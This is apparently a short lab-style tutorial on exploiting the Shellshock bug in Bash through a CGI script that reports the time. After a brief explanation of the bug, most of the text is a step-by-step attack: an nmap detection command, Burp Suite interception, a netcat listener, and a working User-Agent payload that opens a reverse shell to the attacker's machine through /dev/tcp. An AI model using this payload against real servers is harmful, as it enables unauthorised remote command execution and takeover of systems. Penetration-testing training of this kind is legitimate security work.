Shellshock is caused by a bug in how Bash handles environment variables. When Bash processes an environment variable, it also processes any commands that 
are appended to it. This means that an attacker could craft an environment variable that, when processed by Bash, would execute arbitrary commands.

For this example, we will use a site with a CGI (common gateway interface) that gets the time. 
To check if its vulnerable to this attack, we will run the following command
-nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” <target_ip>

Next, we will open up Burpsuite. Make sure you configure your FoxyProxy. Set it to intercept mode, run the gettime.cgi script on the browser, and then
send the result to the repeater. 

Set up a nc listener on you attacking machine. 
-nc -lvp 1337
Add the following code to the User-Agent line in order to establish a reverse shell
- () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<attacker_ip>/<attacker_port> 0>&1'
